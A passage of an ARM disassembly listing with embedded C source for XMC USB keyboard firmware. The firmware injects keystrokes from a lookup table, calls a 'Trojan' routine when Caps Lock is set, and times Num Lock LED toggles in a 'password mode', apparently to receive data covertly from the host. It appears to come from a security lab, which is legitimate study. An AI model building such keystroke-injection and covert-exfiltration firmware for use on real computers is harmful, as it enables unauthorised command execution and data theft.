 800059c:	4b07      	ldr	r3, [pc, #28]	; (80005bc <Trojan+0x50>)
 800059e:	2200      	movs	r2, #0
 80005a0:	601a      	str	r2, [r3, #0]

}
 80005a2:	bf00      	nop
 80005a4:	bd80      	pop	{r7, pc}
 80005a6:	bf00      	nop
 80005a8:	20000670 	.word	0x20000670
 80005ac:	0007a11f 	.word	0x0007a11f
 80005b0:	20000018 	.word	0x20000018
 80005b4:	200001a4 	.word	0x200001a4
 80005b8:	20000140 	.word	0x20000140
 80005bc:	2000064c 	.word	0x2000064c

080005c0 <main>:

/**
 * Main program entry point. This routine configures the hardware required by
 * the application, then enters a loop to run the application tasks in sequence.
 */
int main(void) {
 80005c0:	b580      	push	{r7, lr}
 80005c2:	b082      	sub	sp, #8
 80005c4:	af00      	add	r7, sp, #0
	// Init LED pins for debugging and NUM/CAPS visual report
	XMC_GPIO_SetMode(LED1,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
 80005c6:	2280      	movs	r2, #128	; 0x80
 80005c8:	2101      	movs	r1, #1
 80005ca:	4814      	ldr	r0, [pc, #80]	; (800061c <main+0x5c>)
 80005cc:	f001 ffec 	bl	80025a8 <XMC_GPIO_SetMode>
	XMC_GPIO_SetMode(LED2,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);
 80005d0:	2280      	movs	r2, #128	; 0x80
 80005d2:	2100      	movs	r1, #0
 80005d4:	4811      	ldr	r0, [pc, #68]	; (800061c <main+0x5c>)
 80005d6:	f001 ffe7 	bl	80025a8 <XMC_GPIO_SetMode>
	USB_Init();
 80005da:	f000 fa57 	bl	8000a8c <USB_Init>
	SystemCoreClockSetup();   
 80005de:	f000 f989 	bl	80008f4 <SystemCoreClockSetup>
    //use DWT for more precise timing than SysTick (Stocazzo conta meglio il mio casio da 10 euro)
    CoreDebug -> DEMCR |= CoreDebug_DEMCR_TRCENA_Msk; // Enable DWT
 80005e2:	4b0f      	ldr	r3, [pc, #60]	; (8000620 <main+0x60>)
 80005e4:	68db      	ldr	r3, [r3, #12]
 80005e6:	4a0e      	ldr	r2, [pc, #56]	; (8000620 <main+0x60>)
 80005e8:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 80005ec:	60d3      	str	r3, [r2, #12]
    DWT -> CYCCNT = 0; // Reset the counter
 80005ee:	4b0d      	ldr	r3, [pc, #52]	; (8000624 <main+0x64>)
 80005f0:	2200      	movs	r2, #0
 80005f2:	605a      	str	r2, [r3, #4]
    DWT -> CTRL |= DWT_CTRL_CYCCNTENA_Msk; // Enable the cycle counter 
 80005f4:	4b0b      	ldr	r3, [pc, #44]	; (8000624 <main+0x64>)
 80005f6:	681b      	ldr	r3, [r3, #0]
 80005f8:	4a0a      	ldr	r2, [pc, #40]	; (8000624 <main+0x64>)
 80005fa:	f043 0301 	orr.w	r3, r3, #1
 80005fe:	6013      	str	r3, [r2, #0]
    //SysTick_Config(SystemCoreClock / 1000000);
    //ResetBufferLogic();
	// Wait until host has enumerated HID device
	for(int i = 0; i < 10e6; ++i)
 8000600:	2300      	movs	r3, #0
 8000602:	607b      	str	r3, [r7, #4]
 8000604:	e002      	b.n	800060c <main+0x4c>
 8000606:	687b      	ldr	r3, [r7, #4]
 8000608:	3301      	adds	r3, #1
 800060a:	607b      	str	r3, [r7, #4]
 800060c:	687b      	ldr	r3, [r7, #4]
 800060e:	4a06      	ldr	r2, [pc, #24]	; (8000628 <main+0x68>)
 8000610:	4293      	cmp	r3, r2
 8000612:	dbf8      	blt.n	8000606 <main+0x46>
		; 

	while (1) {
		HID_Device_USBTask(&Keyboard_HID_Interface);
 8000614:	4805      	ldr	r0, [pc, #20]	; (800062c <main+0x6c>)
 8000616:	f002 fa49 	bl	8002aac <HID_Device_USBTask>
 800061a:	e7fb      	b.n	8000614 <main+0x54>
 800061c:	48028100 	.word	0x48028100
 8000620:	e000edf0 	.word	0xe000edf0
 8000624:	e0001000 	.word	0xe0001000
 8000628:	00989680 	.word	0x00989680
 800062c:	200001ec 	.word	0x200001ec

08000630 <CALLBACK_HID_Device_CreateHIDReport>:
bool CALLBACK_HID_Device_CreateHIDReport(
							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
							uint8_t* const ReportID,
							const uint8_t ReportType,
							void* ReportData,
							uint16_t* const ReportSize ) {
 8000630:	b480      	push	{r7}
 8000632:	b087      	sub	sp, #28
 8000634:	af00      	add	r7, sp, #0
 8000636:	60f8      	str	r0, [r7, #12]
 8000638:	60b9      	str	r1, [r7, #8]
 800063a:	603b      	str	r3, [r7, #0]
 800063c:	4613      	mov	r3, r2
 800063e:	71fb      	strb	r3, [r7, #7]
	USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;
 8000640:	683b      	ldr	r3, [r7, #0]
 8000642:	617b      	str	r3, [r7, #20]
	*ReportSize = sizeof(USB_KeyboardReport_Data_t);
 8000644:	6a3b      	ldr	r3, [r7, #32]
 8000646:	2208      	movs	r2, #8
 8000648:	801a      	strh	r2, [r3, #0]

int total_reports = (current_string_length + 1) * 2; // 2 iterations 0 and 1 for each character
 800064a:	4b7d      	ldr	r3, [pc, #500]	; (8000840 <CALLBACK_HID_Device_CreateHIDReport+0x210>)
 800064c:	681b      	ldr	r3, [r3, #0]
 800064e:	3301      	adds	r3, #1
 8000650:	005b      	lsls	r3, r3, #1
 8000652:	613b      	str	r3, [r7, #16]



if (((string_index < total_reports) && (password_enable == 1)) || ((string_index < (trojanLen+1)) && (password_enable == 0))) {
 8000654:	4b7b      	ldr	r3, [pc, #492]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 8000656:	681b      	ldr	r3, [r3, #0]
 8000658:	693a      	ldr	r2, [r7, #16]
 800065a:	429a      	cmp	r2, r3
 800065c:	dd03      	ble.n	8000666 <CALLBACK_HID_Device_CreateHIDReport+0x36>
 800065e:	4b7a      	ldr	r3, [pc, #488]	; (8000848 <CALLBACK_HID_Device_CreateHIDReport+0x218>)
 8000660:	681b      	ldr	r3, [r3, #0]
 8000662:	2b01      	cmp	r3, #1
 8000664:	d00b      	beq.n	800067e <CALLBACK_HID_Device_CreateHIDReport+0x4e>
 8000666:	4b79      	ldr	r3, [pc, #484]	; (800084c <CALLBACK_HID_Device_CreateHIDReport+0x21c>)
 8000668:	681a      	ldr	r2, [r3, #0]
 800066a:	4b76      	ldr	r3, [pc, #472]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 800066c:	681b      	ldr	r3, [r3, #0]
 800066e:	429a      	cmp	r2, r3
 8000670:	f2c0 80dd 	blt.w	800082e <CALLBACK_HID_Device_CreateHIDReport+0x1fe>
 8000674:	4b74      	ldr	r3, [pc, #464]	; (8000848 <CALLBACK_HID_Device_CreateHIDReport+0x218>)
 8000676:	681b      	ldr	r3, [r3, #0]
 8000678:	2b00      	cmp	r3, #0
 800067a:	f040 80d8 	bne.w	800082e <CALLBACK_HID_Device_CreateHIDReport+0x1fe>
    switch(string2sendLut[string_index].Mod) {
 800067e:	4b71      	ldr	r3, [pc, #452]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 8000680:	681b      	ldr	r3, [r3, #0]
 8000682:	4a73      	ldr	r2, [pc, #460]	; (8000850 <CALLBACK_HID_Device_CreateHIDReport+0x220>)
 8000684:	005b      	lsls	r3, r3, #1
 8000686:	4413      	add	r3, r2
 8000688:	785b      	ldrb	r3, [r3, #1]
 800068a:	2b02      	cmp	r3, #2
 800068c:	d06b      	beq.n	8000766 <CALLBACK_HID_Device_CreateHIDReport+0x136>
 800068e:	2b02      	cmp	r3, #2
 8000690:	f300 809d 	bgt.w	80007ce <CALLBACK_HID_Device_CreateHIDReport+0x19e>
 8000694:	2b00      	cmp	r3, #0
 8000696:	d002      	beq.n	800069e <CALLBACK_HID_Device_CreateHIDReport+0x6e>
 8000698:	2b01      	cmp	r3, #1
 800069a:	d030      	beq.n	80006fe <CALLBACK_HID_Device_CreateHIDReport+0xce>
 800069c:	e097      	b.n	80007ce <CALLBACK_HID_Device_CreateHIDReport+0x19e>
        case 0:
            if(characterSent) {
 800069e:	4b6d      	ldr	r3, [pc, #436]	; (8000854 <CALLBACK_HID_Device_CreateHIDReport+0x224>)
 80006a0:	781b      	ldrb	r3, [r3, #0]
 80006a2:	2b00      	cmp	r3, #0
 80006a4:	d00e      	beq.n	80006c4 <CALLBACK_HID_Device_CreateHIDReport+0x94>
			    report->Reserved = 0; 
 80006a6:	697b      	ldr	r3, [r7, #20]
 80006a8:	2200      	movs	r2, #0
 80006aa:	705a      	strb	r2, [r3, #1]
			    report->KeyCode[0] = 0; 
 80006ac:	697b      	ldr	r3, [r7, #20]
 80006ae:	2200      	movs	r2, #0
 80006b0:	709a      	strb	r2, [r3, #2]
			    characterSent = 0;
 80006b2:	4b68      	ldr	r3, [pc, #416]	; (8000854 <CALLBACK_HID_Device_CreateHIDReport+0x224>)
 80006b4:	2200      	movs	r2, #0
 80006b6:	701a      	strb	r2, [r3, #0]
			    string_index++; 
 80006b8:	4b62      	ldr	r3, [pc, #392]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 80006ba:	681b      	ldr	r3, [r3, #0]
 80006bc:	3301      	adds	r3, #1
 80006be:	4a61      	ldr	r2, [pc, #388]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 80006c0:	6013      	str	r3, [r2, #0]
                    startTime = DWT -> CYCCNT;
                }
			characterSent = 1;
		    }
		
            break;
 80006c2:	e0b5      	b.n	8000830 <CALLBACK_HID_Device_CreateHIDReport+0x200>
			    report->Modifier = 0; 
 80006c4:	697b      	ldr	r3, [r7, #20]
 80006c6:	2200      	movs	r2, #0
 80006c8:	701a      	strb	r2, [r3, #0]
			    report->Reserved = 0; 
 80006ca:	697b      	ldr	r3, [r7, #20]
 80006cc:	2200      	movs	r2, #0
 80006ce:	705a      	strb	r2, [r3, #1]
			    report->KeyCode[0] = string2sendLut[string_index].Key;
 80006d0:	4b5c      	ldr	r3, [pc, #368]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 80006d2:	681b      	ldr	r3, [r3, #0]
 80006d4:	4a5e      	ldr	r2, [pc, #376]	; (8000850 <CALLBACK_HID_Device_CreateHIDReport+0x220>)
 80006d6:	f812 2013 	ldrb.w	r2, [r2, r3, lsl #1]
 80006da:	697b      	ldr	r3, [r7, #20]
 80006dc:	709a      	strb	r2, [r3, #2]
                if (string2sendLut[string_index].Key == GERMAN_KEYBOARD_SC_ENTER) { 
 80006de:	4b59      	ldr	r3, [pc, #356]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 80006e0:	681b      	ldr	r3, [r3, #0]
 80006e2:	4a5b      	ldr	r2, [pc, #364]	; (8000850 <CALLBACK_HID_Device_CreateHIDReport+0x220>)
 80006e4:	f812 3013 	ldrb.w	r3, [r2, r3, lsl #1]
 80006e8:	2b28      	cmp	r3, #40	; 0x28
 80006ea:	d104      	bne.n	80006f6 <CALLBACK_HID_Device_CreateHIDReport+0xc6>
                    startTime = DWT -> CYCCNT;
 80006ec:	4b5a      	ldr	r3, [pc, #360]	; (8000858 <CALLBACK_HID_Device_CreateHIDReport+0x228>)
 80006ee:	685b      	ldr	r3, [r3, #4]
 80006f0:	461a      	mov	r2, r3
 80006f2:	4b5a      	ldr	r3, [pc, #360]	; (800085c <CALLBACK_HID_Device_CreateHIDReport+0x22c>)
 80006f4:	601a      	str	r2, [r3, #0]
			characterSent = 1;
 80006f6:	4b57      	ldr	r3, [pc, #348]	; (8000854 <CALLBACK_HID_Device_CreateHIDReport+0x224>)
 80006f8:	2201      	movs	r2, #1
 80006fa:	701a      	strb	r2, [r3, #0]
            break;
 80006fc:	e098      	b.n	8000830 <CALLBACK_HID_Device_CreateHIDReport+0x200>

        case 1: //shift
            if(characterSent) {
 80006fe:	4b55      	ldr	r3, [pc, #340]	; (8000854 <CALLBACK_HID_Device_CreateHIDReport+0x224>)
 8000700:	781b      	ldrb	r3, [r3, #0]
 8000702:	2b00      	cmp	r3, #0
 8000704:	d00e      	beq.n	8000724 <CALLBACK_HID_Device_CreateHIDReport+0xf4>
			    report->Reserved = 0; 
 8000706:	697b      	ldr	r3, [r7, #20]
 8000708:	2200      	movs	r2, #0
 800070a:	705a      	strb	r2, [r3, #1]
			    report->KeyCode[0] = 0; 
 800070c:	697b      	ldr	r3, [r7, #20]
 800070e:	2200      	movs	r2, #0
 8000710:	709a      	strb	r2, [r3, #2]
			    characterSent = 0;
 8000712:	4b50      	ldr	r3, [pc, #320]	; (8000854 <CALLBACK_HID_Device_CreateHIDReport+0x224>)
 8000714:	2200      	movs	r2, #0
 8000716:	701a      	strb	r2, [r3, #0]
			    string_index++; 
 8000718:	4b4a      	ldr	r3, [pc, #296]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 800071a:	681b      	ldr	r3, [r3, #0]
 800071c:	3301      	adds	r3, #1
 800071e:	4a49      	ldr	r2, [pc, #292]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 8000720:	6013      	str	r3, [r2, #0]
                }

			characterSent = 1;
            }

            break;
 8000722:	e085      	b.n	8000830 <CALLBACK_HID_Device_CreateHIDReport+0x200>
			    report->Reserved = 0; 
 8000724:	697b      	ldr	r3, [r7, #20]
 8000726:	2200      	movs	r2, #0
 8000728:	705a      	strb	r2, [r3, #1]
			    report->KeyCode[0] = string2sendLut[string_index].Key;
 800072a:	4b46      	ldr	r3, [pc, #280]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 800072c:	681b      	ldr	r3, [r3, #0]
 800072e:	4a48      	ldr	r2, [pc, #288]	; (8000850 <CALLBACK_HID_Device_CreateHIDReport+0x220>)
 8000730:	f812 2013 	ldrb.w	r2, [r2, r3, lsl #1]
 8000734:	697b      	ldr	r3, [r7, #20]
 8000736:	709a      	strb	r2, [r3, #2]
                if (string2sendLut[string_index].Key == GERMAN_KEYBOARD_SC_ENTER) { 
 8000738:	4b42      	ldr	r3, [pc, #264]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 800073a:	681b      	ldr	r3, [r3, #0]
 800073c:	4a44      	ldr	r2, [pc, #272]	; (8000850 <CALLBACK_HID_Device_CreateHIDReport+0x220>)
 800073e:	f812 3013 	ldrb.w	r3, [r2, r3, lsl #1]
 8000742:	2b28      	cmp	r3, #40	; 0x28
 8000744:	d108      	bne.n	8000758 <CALLBACK_HID_Device_CreateHIDReport+0x128>
                    startTime = DWT -> CYCCNT;
 8000746:	4b44      	ldr	r3, [pc, #272]	; (8000858 <CALLBACK_HID_Device_CreateHIDReport+0x228>)
 8000748:	685b      	ldr	r3, [r3, #4]
 800074a:	461a      	mov	r2, r3
 800074c:	4b43      	ldr	r3, [pc, #268]	; (800085c <CALLBACK_HID_Device_CreateHIDReport+0x22c>)
 800074e:	601a      	str	r2, [r3, #0]
                    report -> Modifier = 0;
 8000750:	697b      	ldr	r3, [r7, #20]
 8000752:	2200      	movs	r2, #0
 8000754:	701a      	strb	r2, [r3, #0]
 8000756:	e002      	b.n	800075e <CALLBACK_HID_Device_CreateHIDReport+0x12e>
                    report->Modifier = 0x02; 
 8000758:	697b      	ldr	r3, [r7, #20]
 800075a:	2202      	movs	r2, #2
 800075c:	701a      	strb	r2, [r3, #0]
			characterSent = 1;
 800075e:	4b3d      	ldr	r3, [pc, #244]	; (8000854 <CALLBACK_HID_Device_CreateHIDReport+0x224>)
 8000760:	2201      	movs	r2, #1
 8000762:	701a      	strb	r2, [r3, #0]
            break;
 8000764:	e064      	b.n	8000830 <CALLBACK_HID_Device_CreateHIDReport+0x200>


        case 2: //AltGr
            if(characterSent) {
 8000766:	4b3b      	ldr	r3, [pc, #236]	; (8000854 <CALLBACK_HID_Device_CreateHIDReport+0x224>)
 8000768:	781b      	ldrb	r3, [r3, #0]
 800076a:	2b00      	cmp	r3, #0
 800076c:	d00e      	beq.n	800078c <CALLBACK_HID_Device_CreateHIDReport+0x15c>
			    report->Reserved = 0; 
 800076e:	697b      	ldr	r3, [r7, #20]
 8000770:	2200      	movs	r2, #0
 8000772:	705a      	strb	r2, [r3, #1]
			    report->KeyCode[0] = 0; 
 8000774:	697b      	ldr	r3, [r7, #20]
 8000776:	2200      	movs	r2, #0
 8000778:	709a      	strb	r2, [r3, #2]
			    characterSent = 0;
 800077a:	4b36      	ldr	r3, [pc, #216]	; (8000854 <CALLBACK_HID_Device_CreateHIDReport+0x224>)
 800077c:	2200      	movs	r2, #0
 800077e:	701a      	strb	r2, [r3, #0]
			    string_index++; 
 8000780:	4b30      	ldr	r3, [pc, #192]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 8000782:	681b      	ldr	r3, [r3, #0]
 8000784:	3301      	adds	r3, #1
 8000786:	4a2f      	ldr	r2, [pc, #188]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 8000788:	6013      	str	r3, [r2, #0]
                }

			characterSent = 1;
            }

            break;
 800078a:	e051      	b.n	8000830 <CALLBACK_HID_Device_CreateHIDReport+0x200>
			    report->Reserved = 0; 
 800078c:	697b      	ldr	r3, [r7, #20]
 800078e:	2200      	movs	r2, #0
 8000790:	705a      	strb	r2, [r3, #1]
			    report->KeyCode[0] = string2sendLut[string_index].Key;
 8000792:	4b2c      	ldr	r3, [pc, #176]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 8000794:	681b      	ldr	r3, [r3, #0]
 8000796:	4a2e      	ldr	r2, [pc, #184]	; (8000850 <CALLBACK_HID_Device_CreateHIDReport+0x220>)
 8000798:	f812 2013 	ldrb.w	r2, [r2, r3, lsl #1]
 800079c:	697b      	ldr	r3, [r7, #20]
 800079e:	709a      	strb	r2, [r3, #2]
                if (string2sendLut[string_index].Key == GERMAN_KEYBOARD_SC_ENTER) { 
 80007a0:	4b28      	ldr	r3, [pc, #160]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 80007a2:	681b      	ldr	r3, [r3, #0]
 80007a4:	4a2a      	ldr	r2, [pc, #168]	; (8000850 <CALLBACK_HID_Device_CreateHIDReport+0x220>)
 80007a6:	f812 3013 	ldrb.w	r3, [r2, r3, lsl #1]
 80007aa:	2b28      	cmp	r3, #40	; 0x28
 80007ac:	d108      	bne.n	80007c0 <CALLBACK_HID_Device_CreateHIDReport+0x190>
                    startTime = DWT -> CYCCNT;
 80007ae:	4b2a      	ldr	r3, [pc, #168]	; (8000858 <CALLBACK_HID_Device_CreateHIDReport+0x228>)
 80007b0:	685b      	ldr	r3, [r3, #4]
 80007b2:	461a      	mov	r2, r3
 80007b4:	4b29      	ldr	r3, [pc, #164]	; (800085c <CALLBACK_HID_Device_CreateHIDReport+0x22c>)
 80007b6:	601a      	str	r2, [r3, #0]
                    report -> Modifier = 0;
 80007b8:	697b      	ldr	r3, [r7, #20]
 80007ba:	2200      	movs	r2, #0
 80007bc:	701a      	strb	r2, [r3, #0]
 80007be:	e002      	b.n	80007c6 <CALLBACK_HID_Device_CreateHIDReport+0x196>
                    report->Modifier = 0x40; 
 80007c0:	697b      	ldr	r3, [r7, #20]
 80007c2:	2240      	movs	r2, #64	; 0x40
 80007c4:	701a      	strb	r2, [r3, #0]
			characterSent = 1;
 80007c6:	4b23      	ldr	r3, [pc, #140]	; (8000854 <CALLBACK_HID_Device_CreateHIDReport+0x224>)
 80007c8:	2201      	movs	r2, #1
 80007ca:	701a      	strb	r2, [r3, #0]
            break;
 80007cc:	e030      	b.n	8000830 <CALLBACK_HID_Device_CreateHIDReport+0x200>
        default:
            if(characterSent) {
 80007ce:	4b21      	ldr	r3, [pc, #132]	; (8000854 <CALLBACK_HID_Device_CreateHIDReport+0x224>)
 80007d0:	781b      	ldrb	r3, [r3, #0]
 80007d2:	2b00      	cmp	r3, #0
 80007d4:	d00e      	beq.n	80007f4 <CALLBACK_HID_Device_CreateHIDReport+0x1c4>
			    report->Reserved = 0; 
 80007d6:	697b      	ldr	r3, [r7, #20]
 80007d8:	2200      	movs	r2, #0
 80007da:	705a      	strb	r2, [r3, #1]
			    report->KeyCode[0] = 0; 
 80007dc:	697b      	ldr	r3, [r7, #20]
 80007de:	2200      	movs	r2, #0
 80007e0:	709a      	strb	r2, [r3, #2]
			    characterSent = 0;
 80007e2:	4b1c      	ldr	r3, [pc, #112]	; (8000854 <CALLBACK_HID_Device_CreateHIDReport+0x224>)
 80007e4:	2200      	movs	r2, #0
 80007e6:	701a      	strb	r2, [r3, #0]
			    string_index++; 
 80007e8:	4b16      	ldr	r3, [pc, #88]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 80007ea:	681b      	ldr	r3, [r3, #0]
 80007ec:	3301      	adds	r3, #1
 80007ee:	4a15      	ldr	r2, [pc, #84]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 80007f0:	6013      	str	r3, [r2, #0]
                    startTime = DWT -> CYCCNT;
                }
			characterSent = 1;
		    }
		
            break;
 80007f2:	e01d      	b.n	8000830 <CALLBACK_HID_Device_CreateHIDReport+0x200>
			    report->Modifier = 0; 
 80007f4:	697b      	ldr	r3, [r7, #20]
 80007f6:	2200      	movs	r2, #0
 80007f8:	701a      	strb	r2, [r3, #0]
			    report->Reserved = 0; 
 80007fa:	697b      	ldr	r3, [r7, #20]
 80007fc:	2200      	movs	r2, #0
 80007fe:	705a      	strb	r2, [r3, #1]
			    report->KeyCode[0] = string2sendLut[string_index].Key;
 8000800:	4b10      	ldr	r3, [pc, #64]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 8000802:	681b      	ldr	r3, [r3, #0]
 8000804:	4a12      	ldr	r2, [pc, #72]	; (8000850 <CALLBACK_HID_Device_CreateHIDReport+0x220>)
 8000806:	f812 2013 	ldrb.w	r2, [r2, r3, lsl #1]
 800080a:	697b      	ldr	r3, [r7, #20]
 800080c:	709a      	strb	r2, [r3, #2]
                if (string2sendLut[string_index].Key == GERMAN_KEYBOARD_SC_ENTER) { 
 800080e:	4b0d      	ldr	r3, [pc, #52]	; (8000844 <CALLBACK_HID_Device_CreateHIDReport+0x214>)
 8000810:	681b      	ldr	r3, [r3, #0]
 8000812:	4a0f      	ldr	r2, [pc, #60]	; (8000850 <CALLBACK_HID_Device_CreateHIDReport+0x220>)
 8000814:	f812 3013 	ldrb.w	r3, [r2, r3, lsl #1]
 8000818:	2b28      	cmp	r3, #40	; 0x28
 800081a:	d104      	bne.n	8000826 <CALLBACK_HID_Device_CreateHIDReport+0x1f6>
                    startTime = DWT -> CYCCNT;
 800081c:	4b0e      	ldr	r3, [pc, #56]	; (8000858 <CALLBACK_HID_Device_CreateHIDReport+0x228>)
 800081e:	685b      	ldr	r3, [r3, #4]
 8000820:	461a      	mov	r2, r3
 8000822:	4b0e      	ldr	r3, [pc, #56]	; (800085c <CALLBACK_HID_Device_CreateHIDReport+0x22c>)
 8000824:	601a      	str	r2, [r3, #0]
			characterSent = 1;
 8000826:	4b0b      	ldr	r3, [pc, #44]	; (8000854 <CALLBACK_HID_Device_CreateHIDReport+0x224>)
 8000828:	2201      	movs	r2, #1
 800082a:	701a      	strb	r2, [r3, #0]
            break;
 800082c:	e000      	b.n	8000830 <CALLBACK_HID_Device_CreateHIDReport+0x200>
    }
	}
 800082e:	bf00      	nop
	return true;
 8000830:	2301      	movs	r3, #1
}
 8000832:	4618      	mov	r0, r3
 8000834:	371c      	adds	r7, #28
 8000836:	46bd      	mov	sp, r7
 8000838:	f85d 7b04 	ldr.w	r7, [sp], #4
 800083c:	4770      	bx	lr
 800083e:	bf00      	nop
 8000840:	20000014 	.word	0x20000014
 8000844:	2000064c 	.word	0x2000064c
 8000848:	20000000 	.word	0x20000000
 800084c:	20000018 	.word	0x20000018
 8000850:	20000140 	.word	0x20000140
 8000854:	20000660 	.word	0x20000660
 8000858:	e0001000 	.word	0xe0001000
 800085c:	20000670 	.word	0x20000670

08000860 <CALLBACK_HID_Device_ProcessHIDReport>:
void CALLBACK_HID_Device_ProcessHIDReport(
						USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
						const uint8_t ReportID,
						const uint8_t ReportType,
						const void* ReportData,
						const uint16_t ReportSize ) {
 8000860:	b580      	push	{r7, lr}
 8000862:	b086      	sub	sp, #24
 8000864:	af00      	add	r7, sp, #0
 8000866:	60f8      	str	r0, [r7, #12]
 8000868:	607b      	str	r3, [r7, #4]
 800086a:	460b      	mov	r3, r1
 800086c:	72fb      	strb	r3, [r7, #11]
 800086e:	4613      	mov	r3, r2
 8000870:	72bb      	strb	r3, [r7, #10]
	uint8_t *report = (uint8_t*)ReportData;
 8000872:	687b      	ldr	r3, [r7, #4]
 8000874:	617b      	str	r3, [r7, #20]


	if(*report & HID_KEYBOARD_LED_NUMLOCK) {
 8000876:	697b      	ldr	r3, [r7, #20]
 8000878:	781b      	ldrb	r3, [r3, #0]
 800087a:	f003 0301 	and.w	r3, r3, #1
 800087e:	2b00      	cmp	r3, #0
 8000880:	d00c      	beq.n	800089c <CALLBACK_HID_Device_ProcessHIDReport+0x3c>
        if (password_enable == 1){
 8000882:	4b19      	ldr	r3, [pc, #100]	; (80008e8 <CALLBACK_HID_Device_ProcessHIDReport+0x88>)
 8000884:	681b      	ldr	r3, [r3, #0]
 8000886:	2b01      	cmp	r3, #1
 8000888:	d103      	bne.n	8000892 <CALLBACK_HID_Device_ProcessHIDReport+0x32>
            MeasureLedToggleDistance();
 800088a:	f7ff fd69 	bl	8000360 <MeasureLedToggleDistance>
            bufferlogic();
 800088e:	f7ff fdad 	bl	80003ec <bufferlogic>
        }

        XMC_GPIO_SetOutputHigh(LED1);
 8000892:	2101      	movs	r1, #1
 8000894:	4815      	ldr	r0, [pc, #84]	; (80008ec <CALLBACK_HID_Device_ProcessHIDReport+0x8c>)
 8000896:	f7ff fd0c 	bl	80002b2 <XMC_GPIO_SetOutputHigh>
 800089a:	e003      	b.n	80008a4 <CALLBACK_HID_Device_ProcessHIDReport+0x44>

    }
	else 
		XMC_GPIO_SetOutputLow(LED1);
 800089c:	2101      	movs	r1, #1
 800089e:	4813      	ldr	r0, [pc, #76]	; (80008ec <CALLBACK_HID_Device_ProcessHIDReport+0x8c>)
 80008a0:	f7ff fd18 	bl	80002d4 <XMC_GPIO_SetOutputLow>
 
	
	
	if(*report & HID_KEYBOARD_LED_CAPSLOCK){
 80008a4:	697b      	ldr	r3, [r7, #20]
 80008a6:	781b      	ldrb	r3, [r3, #0]
 80008a8:	f003 0302 	and.w	r3, r3, #2
 80008ac:	2b00      	cmp	r3, #0
 80008ae:	d013      	beq.n	80008d8 <CALLBACK_HID_Device_ProcessHIDReport+0x78>
        password_enable = 0; // Disable password mode
 80008b0:	4b0d      	ldr	r3, [pc, #52]	; (80008e8 <CALLBACK_HID_Device_ProcessHIDReport+0x88>)
 80008b2:	2200      	movs	r2, #0
 80008b4:	601a      	str	r2, [r3, #0]
		XMC_GPIO_SetOutputHigh(LED2);
 80008b6:	2100      	movs	r1, #0
 80008b8:	480c      	ldr	r0, [pc, #48]	; (80008ec <CALLBACK_HID_Device_ProcessHIDReport+0x8c>)
 80008ba:	f7ff fcfa 	bl	80002b2 <XMC_GPIO_SetOutputHigh>
        static bool hasRunTrojan = false;
        if (!hasRunTrojan) {
 80008be:	4b0c      	ldr	r3, [pc, #48]	; (80008f0 <CALLBACK_HID_Device_ProcessHIDReport+0x90>)
 80008c0:	781b      	ldrb	r3, [r3, #0]
 80008c2:	f083 0301 	eor.w	r3, r3, #1
 80008c6:	b2db      	uxtb	r3, r3
 80008c8:	2b00      	cmp	r3, #0
 80008ca:	d009      	beq.n	80008e0 <CALLBACK_HID_Device_ProcessHIDReport+0x80>
            
            Trojan();
 80008cc:	f7ff fe4e 	bl	800056c <Trojan>
            hasRunTrojan = true;
 80008d0:	4b07      	ldr	r3, [pc, #28]	; (80008f0 <CALLBACK_HID_Device_ProcessHIDReport+0x90>)
 80008d2:	2201      	movs	r2, #1
 80008d4:	701a      	strb	r2, [r3, #0]
        }

    }else 
		XMC_GPIO_SetOutputLow(LED2);
}
 80008d6:	e003      	b.n	80008e0 <CALLBACK_HID_Device_ProcessHIDReport+0x80>
		XMC_GPIO_SetOutputLow(LED2);
 80008d8:	2100      	movs	r1, #0
 80008da:	4804      	ldr	r0, [pc, #16]	; (80008ec <CALLBACK_HID_Device_ProcessHIDReport+0x8c>)
 80008dc:	f7ff fcfa 	bl	80002d4 <XMC_GPIO_SetOutputLow>
}
 80008e0:	bf00      	nop
 80008e2:	3718      	adds	r7, #24
 80008e4:	46bd      	mov	sp, r7
 80008e6:	bd80      	pop	{r7, pc}
 80008e8:	20000000 	.word	0x20000000
 80008ec:	48028100 	.word	0x48028100
 80008f0:	20000674 	.word	0x20000674

080008f4 <SystemCoreClockSetup>:

void SystemCoreClockSetup(void) {
 80008f4:	b580      	push	{r7, lr}
 80008f6:	af00      	add	r7, sp, #0
	/* Setup settings for USB clock */
	XMC_SCU_CLOCK_Init(&clock_config);
 80008f8:	480a      	ldr	r0, [pc, #40]	; (8000924 <SystemCoreClockSetup+0x30>)
 80008fa:	f000 fc49 	bl	8001190 <XMC_SCU_CLOCK_Init>

	XMC_SCU_CLOCK_EnableUsbPll();
 80008fe:	f001 f90d 	bl	8001b1c <XMC_SCU_CLOCK_EnableUsbPll>
	XMC_SCU_CLOCK_StartUsbPll(2, 64);
 8000902:	2140      	movs	r1, #64	; 0x40
 8000904:	2002      	movs	r0, #2
 8000906:	f001 f92d 	bl	8001b64 <XMC_SCU_CLOCK_StartUsbPll>
	XMC_SCU_CLOCK_SetUsbClockDivider(4);
